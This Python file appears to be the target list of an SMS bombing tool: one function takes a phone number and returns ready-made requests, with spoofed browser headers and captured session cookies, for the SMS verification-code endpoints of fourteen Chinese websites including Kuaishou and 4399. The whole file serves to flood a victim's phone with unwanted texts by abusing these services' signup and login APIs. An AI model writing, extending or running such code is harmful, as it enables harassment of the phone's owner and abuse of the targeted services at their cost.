
Get=['sxk','hc','rsk','cemo','s399','yj','jrh']
def preparingnumber(number):
    game_url = 'https://m.bigplayers.com/api/user/v1/smsCode/sendLoginSmsV2'
    game_payload = {
        "phoneNumber": f"86{number}",

        "areaCode": "86",
        "captchaVerifyParam": "{\"sceneId\":\"1ns8ckkp\",\"certifyId\":\"x5uU0wAifK\",\"deviceToken\":\"...\"}"
    }
    game_headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "clienttype": "0",
        "content-type": "application/json;charset=UTF-8",
        "cookie": "...",
        "countryid": "26",
        "distinctid": "...",
        "istoken": "false",
        "languageid": "6",
        "latestreferrer": "https://m.bigplayers.com/preview?fromPcPage=%2F",
        "latestreferrerhost": "https://m.bigplayers.com",
        "origin": "https://m.bigplayers.com",
        "os": "2",
        "priority": "u=1, i",
        "referer": "https://m.bigplayers.com/",
        "screenheight": "591",
        "screenwidth": "400",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Microsoft Edge\";v=\"138\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
    }
    Game = [game_url, game_payload, game_headers]

    hxx_url = 'https://api.hexiaoxiang.com/cerberus/turingtest'
    hxx_payload = {
        "cellphone": number,
        "session_id": "...",
        "sig": "...",
        "token": "...",
        "scene": "ic_message_h5"
    }
    hxx_headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "content-length": "658",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.hexiaoxiang.com",
        "priority": "u=1, i",
        "referer": "https://www.hexiaoxiang.com/",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Microsoft Edge\";v=\"138\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
    }
    Hxx = [hxx_url, hxx_payload, hxx_headers]

    ks_url = "https://id.kuaishou.com/pass/kuaishou/sms/requestMobileCode"
    ks_payload = {
        "sid": "kuaishou.server.webday7",
        "type": 53,
        "countryCode": "+86",
        "phone": number,
        "account": "",
        "ztIdentityVerificationType": "",
        "ztIdentityVerificationCheckToken": "",
        "channelType": "UNKNOWN",
        "encryptHeaders": ""
    }
    ks_headers = {}
    Ks = [ks_url, ks_payload, ks_headers]

    sdc_url = 'https://passport.shuidihuzhu.com/api/account/v3/verify-code-send'
    sdc_payload = {
        "mobile": number,
        "key": "REG-CFANPBDE"
    }
    sdc_headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "authorizationv2": "",
        "content-length": "45",

        "content-type": "application/json",
        "origin": "https://www.shuidichou.com",
        "priority": "u=1, i",
        "referer": "https://www.shuidichou.com/",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Microsoft Edge\";v=\"138\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "shuidi-app-code": "",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
    }
    Sdc = [sdc_url, sdc_payload, sdc_headers]

    sjzg_url = "https://www.vcg.com/graphql/sendCode"
    sjzg_payload = {
        "value": number,
        "type": "mobile"
    }
    sjzg_headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "connection": "keep-alive",
        "content-length": "39",
        "content-type": "application/json",
        "cookie": "...",
        "host": "www.vcg.com",
        "origin": "https://www.vcg.com",
        "referer": "https://www.vcg.com/",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Microsoft Edge\";v=\"138\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
    }
    Sjzg = [sjzg_url, sjzg_payload, sjzg_headers]

    sxk_url = f'https://cq.sankuanyun.com/register/sms?phone_number={number}'
    sxk_payload = {'phone_number': number}
    sxk_headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "cookie": "...",
        "priority": "u=1, i",
        "referer": "https://cq.sankuanyun.com/",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Microsoft Edge\";v=\"138\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0",
        "x-requested-with": "XMLHttpRequest"
    }
    Sxk = [sxk_url, sxk_payload, sxk_headers]

    zmn_url = 'https://c.xiujiadian.com/uac/mobile/sendCaptchaWithType'
    zmn_payload = {
        "mobile": number,
        "type": 300,
        "meid": "cb7c61f43145c0408df712180d10f378"
    }
    zmn_headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "channelid": "40002",
        "cityid": "500100",
        "content-length": "77",
        "content-type": "application/json",
        "cooperationid": "40002",
        "origin": "https://prc.zmn.cn",
        "platid": "10",
        "priority": "u=1, i",
        "provinceid": "500000",
        "referer": "https://prc.zmn.cn/",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Microsoft Edge\";v=\"138\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "token": "",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"

    }
    Zmn = [zmn_url, zmn_payload, zmn_headers]

    hc_url=f'https://auth.huace.cn/api/v1/customers/actions/telephone-captcha?telephone={number}&country=%2B86&type=login_type'
    hc_payload = {
        "telephone": number,
        "country": "+86",
        "type": "login_type"
    }
    hc_headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "clientid": "a446350f95de",
        "connection": "keep-alive",
        "content-language": "zh-CN",
        "cookie": "CHC_LANGUAGE=zh-CN",
        "host": "auth.huace.cn",
        "referer": "https://auth.huace.cn/login?client_id=a446350f95de&client_code=cloud-survey-client&redirect=https%3A%2F%2Fcloud.huace.cn",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Microsoft Edge\";v=\"139\", \"Chromium\";v=\"139\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
        "x-requested-with": "XMLHttpRequest"
    }
    Hc=[hc_url, hc_payload, hc_headers]

    rsk_url=f'https://rsks.class.com.cn/v3/msg/front/commons/getCaptcha?mobile={number}'
    rsk_payload = {
        "mobile": number
    }
    rsk_headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "authorization": "Bearer",
        "connection": "keep-alive",
        "cookie": "HWWAFSESTIME=1754809700924; HWWAFSESID=341ad73f9a1ebaa7e3; Hm_lvt_1f060a73b23f9182af22ad065537307b=1754809704; HMACCOUNT=FF4E43BDD4FFE36E; Hm_lpvt_1f060a73b23f9182af22ad065537307b=1754809707",
        "host": "rsks.class.com.cn",
        "referer": "https://rsks.class.com.cn/register",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Microsoft Edge\";v=\"139\", \"Chromium\";v=\"139\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
    }
    Rsk=[rsk_url, rsk_payload, rsk_headers]

    xz_url='https://xiezuocat.com/verify?type=signup'
    xz_payload ={'phone': f"86-{number}"}
    xz_headers = {
        "accept": "application/json, text/plain, */*; charset=utf-8",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "cache-control": "no-cache",
        "content-length": "26",
        "content-type": "application/json",
        "cookie": "sid=32905228298746c5be49fd1c595d4a22; traceid=6085cf62e12645da; _ga=GA1.1.395451313.1754811474; Hm_lvt_099c1a390e23e6b73b081c48519f6e8e=1754811475; Hm_lpvt_099c1a390e23e6b73b081c48519f6e8e=1754811475; HMACCOUNT=FF4E43BDD4FFE36E; JSESSIONID=D3EAA6E47332CEE83DD10077489AD1C3; _ga_NCW16CFM07=GS2.1.s1754811474$o1$g0$t1754811482$j52$l0$h0",
        "origin": "https://xiezuocat.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://xiezuocat.com/",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Microsoft Edge\";v=\"139\", \"Chromium\";v=\"139\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
    }
    Xz=[xz_url, xz_payload, xz_headers]

    cemo_url=f'https://passport.cnmo.com/index.php?c=Member_Ajax_Register&m=SendMessageCode&Jsoncallback=jQuery18309194080132428769_1754820202731&mobile={number}&type=5&codeimg=EE7F&_=1754820229348'
    cemo_payload ={
        "c": "Member_Ajax_Register",
        "m": "SendMessageCode",
        "Jsoncallback": "jQuery18309194080132428769_1754820202731",
        "mobile": number,
        "type": "5",
        "codeimg": "EE7F",
        "_": "1754820229348"
    }
    cemo_headers = {
        "accept": "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "connection": "keep-alive",
        "cookie": "PHPSESSID=b9vjoagrb6ch5m2t2mc4o31m13; cnmo_e476_LGTK=BTYSERZPBWROTPRPBIYOIAZPBGIOKCRDBGYFTE7NBIRI; cd35a471-68cb-4d42-83f4-6f5c27a3ca53=1a4f265089ae9db45f6ecc0851dc2cf4; cnmo_e476_post_seccode=a26f7NMQTHOJQE%2BkdvshM0RLdkzMl5PpUuGXfhIfLkys5gXYY2fOMTbA0OU",
        "host": "passport.cnmo.com",
        "referer": "https://passport.cnmo.com/",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Microsoft Edge\";v=\"139\", \"Chromium\";v=\"139\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
        "x-requested-with": "XMLHttpRequest"
    }
    Cemo=[cemo_url, cemo_payload, cemo_headers]

    
    s399_url=f'https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={number}&appId=www_home&v=1&sig=&t=1755144025802&v=1'
    s399_payload =  {
        "phone": number,
        "appId": "www_home",
        "v": "1",
        "sig": "",
        "t": "1755144025802",
    }
    s399_headers ={
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "connection": "keep-alive",
        "cookie": "UM_distinctid=19828547a6a698-034044c416feb88-4c657b58-100200-19828547a6b40b; _gprp_c=\"\"; _4399stats_vid=17530851152592651; Hm_lvt_f1fb60d2559a83c8fa1ee6125a352bd7=1753085115; _4399tongji_vid=17530851226865; home4399=yes; Hm_lvt_334aca66d28b3b338a76075366b2b9e8=1753023282,1755144012; Hm_lpvt_334aca66d28b3b338a76075366b2b9e8=1755144012; HMACCOUNT=FF4E43BDD4FFE36E; USESSIONID=1db836d8-1629-4c84-9dc6-068bbf81af03; phlogact=l214415p14418",
        "host": "ptlogin.4399.com",
        "referer": "https://ptlogin.4399.com/ptlogin/phoneLoginFrame.do?loginMode=login_phone&crossDomainIFrame=&postLoginHandler=default&redirectUrl=&displayMode=popup&css=&appId=www_home&gameId=&username=&externalLogin=qq&password=&mainDivId=popup_phonelogin_div&autoLogin=true&includeFcmInfo=false&qrLogin=true&userNameLabel=4399%E7%94%A8%E6%88%B7%E5%90%8D&userNameTip=%E8%AF%B7%E8%BE%93%E5%85%A54399%E7%94%A8%E6%88%B7%E5%90%8D&welcomeTip=%E6%AC%A2%E8%BF%8E%E5%9B%9E%E5%88%B04399&regLevel=4&loginLevel=0&bizId=&v=1755144018529&v=1755144018529&iframeId=popup_phone_login_frame",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Microsoft Edge\";v=\"139\", \"Chromium\";v=\"139\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
    }
    S399=[s399_url, s399_payload, s399_headers]

    yj_url=f'https://www.yojiang.cn/api/user/send_verify_code?phone={number}'
    yj_payload = {
        "phone": number
    }
    yj_headers ={
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "connection": "keep-alive",
        "cookie": "guest_uuid=68a157db1b91620ba03e1673; Hm_lvt_b8feb3bac8c21f12c39b6af852dd50f4=1755404252; Hm_lpvt_b8feb3bac8c21f12c39b6af852dd50f4=1755404252; HMACCOUNT=FF4E43BDD4FFE36E",
        "host": "www.yojiang.cn",
        "referer": "https://www.yojiang.cn/",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Microsoft Edge\";v=\"139\", \"Chromium\";v=\"139\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
    }
    Yj=[yj_url, yj_payload, yj_headers]    

    jrh_url=f'https://jrh.financeun.com/Login/sendMessageCode3.html?mobile={number}&mbid=197858&check=3'
    jrh_payload ={
        "mobile":number,
        "mbid": "197858",
        "check": "3"
    }
    jrh_headers ={
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "cookie": "PHPSESSID=gec5518lhtbmv0r4h0lta245e7; jrh_visit_log=gec5518lhtbmv0r4h0lta245e7; Hm_lvt_b627bb080fd97f01181b26820034cfcb=1755410535; Hm_lpvt_b627bb080fd97f01181b26820034cfcb=1755410535; HMACCOUNT=FF4E43BDD4FFE36E",
        "priority": "u=1, i",
        "referer": "https://jrh.financeun.com/",
        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Microsoft Edge\";v=\"139\", \"Chromium\";v=\"139\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
        "x-requested-with": "XMLHttpRequest"
    }
    Jrh=[jrh_url, jrh_payload, jrh_headers]

    conclusion={'game': Game,'hxx': Hxx,'kuaishou': Ks,'sdc': Sdc,'sjzg': Sjzg,'sxk': Sxk,
                'zmn': Zmn,'hc': Hc,'rsk': Rsk,'xz': Xz,'cemo': Cemo,'s399': S399,'yj': Yj,'jrh': Jrh
                }
    return conclusion
